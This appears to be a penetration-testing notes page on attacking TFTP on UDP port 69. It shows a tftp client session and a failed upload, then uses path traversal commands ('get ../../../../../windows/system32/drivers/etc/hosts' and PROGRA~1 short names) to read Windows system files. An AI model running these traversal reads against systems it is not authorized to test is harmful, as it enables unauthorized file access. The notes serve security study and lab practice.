# 69 - TFTP (UDP)

We find TFTP is a trivial FTP service with neither authentication nor directory listing. That means we can use it but we cannot list files, just download/upload.

{% hint style="info" %}
TRY NO/NULL AUTHENTICATION&#x20;



Default path is

```
/var/lib/tftpboot/
```
{% endhint %}

```bash
tftp $box                                                                                                                                                                
tftp> help                                                                                                                                                                   
?Invalid command                                                                                                                                                             
tftp> ?                                                                                                                                                                      
Commands may be abbreviated.  Commands are:                                                                                                                                  
                                                                                                                                                                             
connect         connect to remote tftp                                                                                                                                       
mode            set file transfer mode                                                                                                                                       
put             send file                                                                                                                                                    
get             receive file                                                                                                                                                 
quit            exit tftp                                                                                                                                                    
verbose         toggle verbose mode                                                                                                                                          
trace           toggle packet tracing                                                                                                                                        
status          show current status                                                                                                                                          
binary          set mode to octet                                                                                                                                            
ascii           set mode to netascii                                                                                                                                         
rexmt           set per-packet retransmission timeout                                                                                                                        
timeout         set total retransmission timeout                                                                                                                             
?               print help information                                                                                                                                       
tftp> get                                                                                                                                                                    
(files)                                                                                                                                                                      
usage: get host:file host:file ... file, or                                                                                                                                  
       get file file ... file   if connected, or                                                                                                                             
       get host:rfile lfile                                                                                                                                                  
tftp> put allPorts                                                                                                                                                           
Error code 512: Upload request from 192.168.0.1 Forbidden due to security rules.
```

If we find we cannot upload files, our last resort is to download files. But since there is no directory listing, we do not know what to download. Now it's time to enumerate the OS and review the other open ports to see if we can find some juicy/common/default files.

We try to get files using c:\XXX but we get an error. Checking this resource [https://askubuntu.com/questions/571705/take-a-file-from-windows-to-linux-via-tftp](https://askubuntu.com/questions/571705/take-a-file-from-windows-to-linux-via-tftp) we see the format is without C:

{% code overflow="wrap" fullWidth="true" %}
```bash
# We can try to find if hosts file exist
windows\system32\drivers\etc\hosts
# We might need to do path traversal and go back to be able to access the file
../../../../../windows/system32/drivers/etc/hosts
tftp> get ../../../../../windows/system32/drivers/etc/hosts
getting from 10.11.1.1:../../../../../windows/system32/drivers/etc/hosts to hosts [octet]
Received 824 bytes in 0.1 seconds [65920 bits/sec]

# If we need path w/ spaces -> Windows notation of 6 characters and ~1/~2 
https://superuser.com/questions/529400/how-does-progra1-path-notation-work
"PROGRA~1"
tftp> get ..\..\..\..\..\PROGRA~1\MICROS~1\......
```
{% endcode %}
